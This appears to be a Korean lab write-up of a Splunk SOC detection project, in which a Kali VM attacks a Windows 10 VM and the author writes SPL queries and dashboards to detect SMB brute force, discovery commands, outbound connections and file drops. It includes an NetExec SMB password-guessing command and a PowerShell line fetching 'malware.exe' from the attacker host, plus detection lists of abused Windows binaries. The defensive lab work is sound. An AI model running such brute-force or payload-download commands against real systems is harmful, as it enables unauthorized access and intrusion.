---
title: Splunk Windows SOC 탐지 Lab
parent: SIEM / 보안관제 프로젝트
nav_order: 1
---

# Splunk Windows SOC 탐지 Lab

Splunk, Windows Security Event Log, Sysmon을 활용해 Windows 엔드포인트에서 발생하는 공격을 직접 재현하고 그것을 SIEM에서 탐지하고 대시보드화한 보안관제(SOC)실습 프로젝트다.

---

## 프로젝트 개요

공격자는 로그를 남기기 때문에 SOC의 일은 그 로그 속에서 비정상적인 신호를 찾는 것이고 그러려면 공격이 어떤 이벤트를 남기는지를 직접 봐야 한다.

그래서 이 프로젝트에서는 다음 흐름을 한 사이클로 묶었다.

1. Kali에서 Windows 엔드포인트로 실제 공격을 수행
2. 그 행위가 남긴 Windows Security Event Log / Sysmon 로그를 Splunk로 수집
3. 로그에서 공격 패턴을 찾아내는 SPL 탐지 쿼리를 작성
4. 탐지 결과를 대시보드로 시각화

다룬 공격은 SMB Brute Force(인증 공격)부터 침투 후 정보 수집, 외부 연결, 악성 파일 다운로드까지 이어지는 하나의 공격 시나리오다.

## 실습 환경

| 구분 | 내용 |
|---|---|
| Host OS | Arch Linux |
| 가상화 | KVM / QEMU (virbr0, `192.168.122.0/24`) |
| SIEM | Splunk Enterprise (Ubuntu 24.04.4 LTS, `192.168.122.181`) |
| 엔드포인트 | Windows 10 Pro `WORKSTATION-01` (`192.168.122.13`) + Sysmon64 + Splunk Universal Forwarder |
| 공격자 | Kali Linux (`192.168.122.96`) |
| 로그 소스 | Windows Security Event Log, Sysmon Operational Log |

![Lab 구성도](/assets/images/splunk-soc-detection-lab/01_lab_diagram.png)

공격자(Kali) → 엔드포인트(Windows)로 SMB Brute Force와 파일 다운로드가 일어나고 엔드포인트의 로그는 Universal Forwarder를 통해 Splunk 서버로 전달되는 구조다.

## 로그 수집 구성

### 엔드포인트 수집 설정 (inputs.conf)

Windows 엔드포인트의 Universal Forwarder에서 **Security 로그와 Sysmon Operational 로그**를 `main` 인덱스로 수집하도록 구성했다.

경로: `C:\Program Files\SplunkUniversalForwarder\etc\system\local\inputs.conf`

```ini
[WinEventLog://Security]
disabled = false
index = main

[WinEventLog://Microsoft-Windows-Sysmon/Operational]
disabled = false
index = main
renderXml = true
```

### 필드 추출 트러블슈팅 (props.conf)

Sysmon 로그는 수집은 되는데 일부 필드(Image, CommandLine 등)가 제대로 추출되지 않는 문제가 있었다. 원인을 추적해 보니 실제 수집된 `source` 값이 `TA-microsoft-sysmon` 애드온이 기대하는 기본값과 달라, 필드 추출 룰(`REPORT-sysmon`)이 적용되지 않고 있었다.

경로: `/opt/splunk/etc/apps/TA-microsoft-sysmon/local/props.conf`

```ini
[source::WinEventLog:Microsoft-Windows-Sysmon/Operational]
REPORT-sysmon = sysmon-eventid,sysmon-version,sysmon-level,sysmon-task,sysmon-opcode,sysmon-keywords,sysmon-created,sysmon-record,sysmon-correlation,sysmon-channel,sysmon-computer,sysmon-sid,sysmon-data,sysmon-md5,sysmon-sha1,sysmon-sha256,sysmon-imphash,sysmon-hashes,sysmon-filename,sysmon-registry,sysmon-dns-record-data,sysmon-dns-ip-data
```

실제 수집된 `source` 값에 맞는 추출 설정을 추가하자 Sysmon 이벤트 필드가 정상적으로 파싱됐다.
---

## 공격 시나리오 & 탐지

### 사전 준비 — 워드리스트

`employee` 계정명을 확보한 상황을 가정하고, SecLists의 `2024-197_most_used_passwords.txt`(196개) 뒤에 실제 비밀번호(`employee123`)를 추가한 워드리스트를 사용했다. 탐지가 실패 로그뿐 아니라 **성공 직전까지의 패턴**을 잡아내는지 확인하기 위함이다.

![워드리스트에 실제 비밀번호 추가](/assets/images/splunk-soc-detection-lab/02_wordlist_employee123.png)

### 공격 실행 — SMB Brute Force (NetExec)

Kali에서 NetExec(`nxc`)로 엔드포인트의 SMB(445)에 사전 공격을 수행했다.

```bash
nxc smb 192.168.122.13 -u employee -p employee123
```

![NetExec SMB 인증 성공](/assets/images/splunk-soc-detection-lab/03_netexec_smb_success.png)

`[+] WORKSTATION-01\employee:employee123` — 인증에 성공했다.


445/SMB는 Windows 환경에서 거의 항상 열려 있고 도메인에 가입되지 않은 워크그룹 머신이라도 로컬 계정 인증이 가능하다. 그래서 공격자가 가장 먼저 노리는 인증 공격 벡터 중 하나다.

### 로그 생성 — 4625

탐지 룰을 만들기 전에, 공격이 남긴 `4625` 이벤트를 먼저 뜯어봤다.

![4625 Sub_Status / Logon_Type 분석](/assets/images/splunk-soc-detection-lab/04_event_4625_substatus.png)

- **Sub_Status `0xC000006A`** — 사용자 이름은 맞지만 비밀번호가 틀림
즉 존재하는 계정(`employee`)을 대상으로 비밀번호만 바꿔서 입력하는 전형적인 brute force이다. (계정 자체가 없으면 `0xC0000064`)
- **Logon Type 3** — 네트워크 로그온. SMB를 통한 원격 인증 시도임을 의미한다.

---

### 탐지 1 - Brute Force 로그인 실패


**사용 로그:** Windows Security Event Log, `EventCode 4625`, `Logon Type 3`

**MITRE ATT&CK:** Credential Access / Brute Force (T1110)

동일 IP에서 5분 이내에 다수의 로그인 실패가 발생하는 패턴을 탐지한다.

```
index=main source="wineventlog:security" EventCode=4625 Logon_Type=3
| eval target_account=mvfilter(Account_Name!="-" AND Account_Name!="")
| bin _time span=5m
| stats count AS fail_count, dc(target_account) AS unique_accounts, values(target_account) AS targeted_accounts BY _time, Source_Network_Address
| where fail_count >= 5
```

Windows 이벤트에 함께 잡히는 빈 값(`"-"`, `""`)을 제거한 뒤 5분 단위로 묶어 IP별 실패 횟수와 해당 계정을 집계하고 5회 이상 실패한 것만 남긴다.

![Brute Force 탐지 결과](/assets/images/splunk-soc-detection-lab/05_bruteforce_detection.png)

`192.168.122.96`에서 `employee` 계정 대상으로 5분 내 **11건의 로그인 실패**가 탐지됐다.

### 탐지 2 - 로그인 실패에서 계정 잠금까지

**사용 로그:** Windows Security Event Log, `EventCode 4625` + `EventCode 4740`

**MITRE ATT&CK:** Credential Access / Brute Force (T1110)

반복된 실패 끝에 계정이 잠기는(`4740`)것을 확인한다. 단순 실패와 달리 실패 누적 -> 잠금이라는 연결이 보이면 brute force 가능성이 훨씬 높아진다.

```
index=main source="wineventlog:security" (EventCode=4625 OR EventCode=4740) Account_Name=employee
| sort _time
| table _time, EventCode, Account_Name, Source_Network_Address
```

![로그인 실패 후 계정 잠금](/assets/images/splunk-soc-detection-lab/06_failed_login_lockout.png)

`employee` 계정에 `4625`가 반복된 직후 `4740`이 발생한 것이 확인된다.

### 탐지 3 - Discovery 명령어 연속 실행

**사용 로그:** Sysmon Operational, `EventCode 1`(프로세스 생성)

**MITRE ATT&CK:** Discovery — T1033 / T1016 / T1087 / T1082

침투에 성공한 공격자는 보통 시스템, 계정, 네트워크 정보를 수집한다. `whoami`, `ipconfig`, `net`, `net1`, `nltest`, `systeminfo`가 짧은 시간에 몰려 실행되는 패턴을 탐지한다.

```
index=main source="xmlwineventlog:microsoft-windows-sysmon/operational" EventCode=1
    (
    Image="*\\whoami.exe"
    OR Image="*\\ipconfig.exe"
    OR Image="*\\net.exe"
    OR Image="*\\net1.exe"
    OR Image="*\\nltest.exe"
    OR Image="*\\systeminfo.exe"
    )
| bin _time span=5m
| stats count AS cmd_count, values(CommandLine) AS commands BY _time, ParentImage
| where cmd_count >= 3
| sort _time
```

5분 단위, 부모 프로세스별로 Discovery 명령 수를 집계하고, 3개 이상 몰린 구간만 남긴다.

![Discovery 명령어 연속 실행 탐지](/assets/images/splunk-soc-detection-lab/07_discovery_burst.png)

PowerShell에서 `ipconfig /all`, `net localgroup administrators`, `net user`, `whoami /all`이 짧은 시간에 연속 실행된 것이 탐지됐다. 한 가지의 개별 명령 실행은 정상일 수 있지만 부모 프로세스(PowerShell) 하나에서 짧은 시간에 3번 이상의 명령 실행이 몰린다는 게 의심스러운 점이다.


### 공격 재현 — 외부에서 악성 파일 다운로드

공격자는 Kali에 간이 HTTP 서버를 띄우고 가짜 악성 파일을 호스팅했다.

![공격자 HTTP 서버](/assets/images/splunk-soc-detection-lab/08_attacker_http_server.png)

엔드포인트에서는 PowerShell로 그 파일을 내려받는다.

![PowerShell 파일 다운로드](/assets/images/splunk-soc-detection-lab/09_powershell_download.png)

```powershell
Invoke-WebRequest -Uri "http://192.168.122.96:8080/malware.exe" -OutFile "malware.exe"
```

이 한 줄의 명령이 두 가지 흔적을 남긴다 — 외부로의 네트워크 연결(탐지 4)과 파일 생성(탐지 5).

### 탐지 4 - 의심스러운 외부 연결

**사용 로그:** Sysmon Operational, `EventCode 3`(네트워크 연결)

**MITRE ATT&CK:** Command and Control / Application Layer Protocol (T1071)

Powershell, cmd, rundll32, mshta처럼 악용되기 쉬운 프로세스가 로컬 호스트를 제외한 외부 IP로 연결하는 이벤트를 탐지한다.

```
index=main source="xmlwineventlog:microsoft-windows-sysmon/operational" EventCode=3
    (
    Image="*\\powershell.exe"
    OR Image="*\\cmd.exe"
    OR Image="*\\rundll32.exe"
    OR Image="*\\mshta.exe"
    )
    NOT DestinationIp IN ("127.0.0.1", "0:0:0:0:0:0:0:1")
| table _time, User, Image, DestinationIp, DestinationPort
| sort -_time
```

![의심스러운 외부 연결 탐지](/assets/images/splunk-soc-detection-lab/10_suspicious_connection.png)

`employee`의 PowerShell이 `192.168.122.96:8080`으로 연결한 것이 탐지됐다.

### 탐지 5 - 의심스러운 파일 생성

**사용 로그:** Sysmon Operational, `EventCode 11`(파일 생성)

**MITRE ATT&CK:** Command and Control / Ingress Tool Transfer (T1105)

같은 다운로드 프로세스가 Downloads, Temp, Public, Users 경로에 파일을 생성하는 이벤트를 탐지한다.

PowerShell 실행 중 정상 생성되는 `PSScriptPolicyTest`, `StartupProfileData` 등은 오탐을 줄이기 위해 제외했다.

```
index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=11
    (
    Image="*\\powershell.exe"
    OR Image="*\\cmd.exe"
    OR Image="*\\certutil.exe"
    OR Image="*\\bitsadmin.exe"
    )
    (
    TargetFilename="*\\Downloads\\*"
    OR TargetFilename="*\\Temp\\*"
    OR TargetFilename="*\\Public\\*"
    OR TargetFilename="C:\\Users\\*"
    )
    NOT TargetFilename="*PSScriptPolicyTest*"
    NOT TargetFilename="*StartupProfileData*"
| table _time, User, Image, TargetFilename
| sort -_time
```

![의심스러운 파일 생성 탐지](/assets/images/splunk-soc-detection-lab/11_suspicious_file_creation.png)

`employee`의 Powershell이 `C:\Users\employee\malware.exe`를 생성한 것이 탐지됐다.

---

## 대시보드

개별 쿼리를 매번 돌리는 대신, 자주 보는 탐지를 두 개의 모니터링 대시보드로 묶었다.

### 인증 모니터링 (Authentication Monitoring)

시간대별 로그인 실패 추이, Brute Force 탐지 결과, 실패->잠금 타임라인, 이벤트 유형 비율을 한 화면에 모았다.

![인증 모니터링 대시보드](/assets/images/splunk-soc-detection-lab/12_dashboard_authentication.png)

### 엔드포인트 활동 모니터링 (Endpoint Activity Monitoring)

Discovery 명령 버스트, 의심스러운 외부 연결, 의심스러운 파일 생성을 한눈에 볼 수 있도록 구성했다.

![엔드포인트 활동 모니터링 대시보드](/assets/images/splunk-soc-detection-lab/13_dashboard_endpoint.png)

## 프로젝트를 마무리 하며 배운 점

- 로그를 수집하는 것과 검색하는 것은 다른 문제다라는 사실을 알았다. Sysmon 로그가 들어와도 `source` 불일치로 필드가 추출되지 않았고 `props.conf`를 직접 수정해야 검색,탐지가 가능했다.
- 단일 이벤트뿐만 아니라 이벤트 간의 관계를 파악하고 실패->잠금, 외부 연결->파일 생성처럼 이벤트끼리 연결을 해야 오탐을 줄일 수 잇고 공격 흐름이 보인다는 것을 알았다.
- 빈 값과 정상 생성되는 정상 행위를 걸러내며 예외 조건을 추가하는 과정을 하며 오탐 제거 과정도 중요하다는 것을 알았다.